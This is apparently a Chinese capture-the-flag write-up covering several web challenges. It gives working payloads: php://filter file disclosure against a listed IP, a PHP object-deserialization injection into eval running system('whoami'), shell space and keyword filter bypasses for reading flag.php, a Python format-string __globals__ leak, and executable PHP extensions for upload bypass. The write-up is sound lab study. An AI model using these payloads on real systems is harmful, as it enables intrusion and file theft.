## baby-file

![[Pasted image 20231206085736.png]]
#### payload：
82.157.146.43:17682/?file=php://filter/convert.base64-encode/resource=flag.php
然后base64解码查看flag的源码




## object
源码：
```php
 <?php
error_reporting(0);
//flag在flag.php里
class flag
{
    public $cmd='index.php';

    public function __destruct(){
        if (preg_match('/\w+\((?R)?\)/', $this->cmd)){
            eval('$a="'.$this->cmd.'";');
        }
        else {
            die('hack!!!');
        }
    }
}


if (!isset($_GET['fl']) || !isset($_GET['ag'])) {
    die(@highlight_file('index.php',true));
}
else {
    if (!(preg_match('/[A-Za-z0-9]+\(/i', $_GET['fl']))) {
        die('hack!!!');
    }
    else {
        echo unserialize($_GET['ag']);
    }
} 

```

发现ag是一个序列化后的字符串，调用unserialize前并没有对ag进行过滤处理，这个函数参数可以是integer、float、string、array 或 object，如果传递的字符串不可解序列化，则返回 FALSE，若被解序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用  `wakeup()`

回到这个代码：
class flag中，定义了析构函数`__destruct`，在 成员变量 `$cmd` 可以通过 正则表达式验证的情况，则可以构造任意字符串，利用 `eval` 执行。`/\w+\((?R)?\)/`这个正则，可能意在匹配一个函数，但是`(?R)`这个后面有一个`?`，匹配零次或一次，相当于可以忽略

再看`eval('$a="'.$this->cmd.'";');`,可以构造payload
```php
1";phpinfo();highlight_file("flag.php");system("whoami");"
```

所以把这个payload序列化一下：
```php
<?php
// 照抄一份flag类的定义
class flag
{
    public $cmd='index.php';

    public function __destruct(){
        if (preg_match('/\w+\((?R)?\)/', $this->cmd)){
            eval('$a="'.$this->cmd.'";');
        }
        else {
            die('hack!!!');
        }
    }
}
$class = new flag();
$class->cmd = '1";phpinfo();highlight_file("flag.php");system("whoami");"';
$class_ser = serialize($class);
print_r($class_ser);

```
输出
```bash
O:4:"flag":1:{s:3:"cmd";s:55:"1";time();highlight_file("flag.php");system("whoami");"";}
```
payload：
```
?fl=a
(&ag=O:4:"flag":1{s:3:"cmd";s:55:"1";time();highlight_file("flag.php");system("whoami");"";}
```

尝试后失败：
原因：
unserialize后的变量类型为object，而 echo不能直接输出未实现__toString方法的 object变量。但是我们无法去更改后台源码
灵活调整一下：找一种echo可以输出的东西，并且这个东西可以携带对象。能想到的是Array，键名随机，value值弄成对象即可。把该数组进行序列化。
```php
// class flag略，同上
$obj = new flag();
$obj->cmd='1";phpinfo();highlight_file("flag.php");system("whoami");"';
echo serialize(array(
    'a' => $obj
));
echo '<br>';
echo unserialize($_GET['a']);

```
输出：
```bash
a:1:{s:1:"a";O:4:"flag":1:{s:3:"cmd";s:58:"1";phpinfo();highlight_file("flag.php");system("whoami");"";}}$a="1";phpinfo();highlight_file("flag.php");system("whoami");""; 

```
再次尝试成功:
```
?fl=a(&ag=a:1:{s:1:"a";O:4:"flag":1:{s:3:"cmd";s:58:"1";phpinfo();highlight_file("flag.php");system("whoami");"";}}$a="1";phpinfo();highlight_file("flag.php");system("whoami");""; 
```



##  babeRCE

源码：
![[Pasted image 20231206102006.png]]

关于绕过空格:
本来有两种方法：
1.${IFS}
2.$IFS$9
但是这里过滤了数字 所以选择第一中绕过

关于限制关键词
1.可以用反斜杠绕过：
```
ca/t${IFS}fla/g.php
```
2.可以采用空变量来绕过:
```
ca$@t${IFS}fla$@g.php
```





## do you know http

X-Forwarded-For:127.0.0.1
Referer:www.ltyyds.com
User-Agent:LT




##  fake galgame

### 原型链污染

原型对象：
JavaScript 中所有的对象都有一个内置属性，称为它的 **prototype**（原型）。它本身是一个对象，故原型对象也会有它自己的原型，逐渐构成了**原型链**。原型链终止于拥有 **null** 作为其原型的对象上

但是：：：
指向对象原型的属性并**不**是 `prototype`。它的名字不是标准的，但实际上所有浏览器都使用   
`__proto__`  
访问对象原型的标准方法是 Object.getPrototypeOf()

原型对象的属性不是实例对象自身的属性。只要修改原型对象，变动就立刻会体现在所有实例对象上

#### 总结：
原型对象的作用，就是定义所有 实例对象 共享的属性和方法。这也是它被称为原型对象的原因，而实例对象可以视作从原型对象衍生出来的子对象。
![[Pasted image 20231206113125.png]]
![[Pasted image 20231206113108.png]]



## 地狱通信

![[Pasted image 20231206115236.png]]


在format之前exp已经拼接进去了，由于`{0}`是flAg（经过FLAG方法处理，可能是与flag相关的对象），构造`exp={0.__class__.__init__.__globals__}`，读取flAg对象所在类的所有全局变量，找到flag




## ezphp
![[Pasted image 20231206141711.png]]

?a=flag&flag=a




php3，php5，pht，phtml，phps都是php可运行的文件扩展名
